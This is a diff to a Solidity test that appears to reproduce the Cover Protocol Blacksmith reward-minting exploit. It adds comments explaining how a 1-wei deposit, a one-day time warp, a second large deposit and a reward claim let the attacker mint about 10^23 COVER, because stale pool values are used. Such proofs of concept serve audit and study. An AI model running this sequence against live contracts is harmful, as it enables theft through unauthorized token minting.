@@ -63,8 +63,22 @@ contract DhCover20201228Test is DSTest {
         bob.approve(lpToken, address(blacksmith));
 
         bob.deposit(blacksmith, address(lpToken), 1);
+
+        // go 1 day into the future
         hevm.warp(block.timestamp + 1 days);
+
+        // In this call, we update pool.accRewardsPerToken to (100 ether) * 10^12 / 1.
+        // (100 COVER per wei of LP tokens)
+        // Due to not using updated pool values to calculate bob's rewards, however,
+        // Bob receives zero rewards and thus his rewardWriteoff is zero instead of (100 ether).
+        // This means Bob is still eligible to claim his accumulated rewards from the past day.
+        // Bob's staked amount is increased to AMT = 1000 * 10**18.
         bob.deposit(blacksmith, address(lpToken), AMT - 1);
+
+        // This grants Bob (AMT * pool.accRewardsPerToken / 10^12 - rewardWriteoff) COVER.
+        // This essentially grants him COVER as if he had 1000 LP tokens staked for the last
+        // day instead of just 1 wei (which is the value used to update pool.accRewardsPerToken).
+        // Thus he receives 10^21 times (1000 / (1 wei)) more COVER than is appropriate.
         bob.claimRewards(blacksmith, address(lpToken));
 
         // Bob minted 10**23 COVER
